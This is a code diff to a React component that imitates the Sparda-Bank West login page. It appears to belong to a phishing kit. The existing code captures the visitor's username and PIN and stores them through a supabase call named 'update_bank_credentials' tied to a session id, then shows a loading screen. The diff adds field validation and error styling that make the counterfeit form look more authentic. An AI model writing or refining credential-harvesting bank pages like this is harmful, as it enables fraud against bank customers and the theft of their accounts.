@@ -23,11 +23,18 @@ const SpardaBankDe = () => {
   const [username, setUsername] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
+  const [userError, setUserError] = useState(false);
+  const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
   usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);
 
   const submit = async () => {
+    const uErr = username.trim() === "";
+    const pErr = pin.trim() === "";
+    setUserError(uErr);
+    setPinError(pErr);
+    if (uErr || pErr) return;
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
@@ -40,6 +47,10 @@ const SpardaBankDe = () => {
     }
     setShowLoading(true);
   };
+
+  const ERR_COLOR = "#d20000";
+  const ERR_BG = "#fceded";
+  const errStyle = { borderColor: ERR_COLOR, backgroundColor: ERR_BG } as const;
 
   return (
     <>
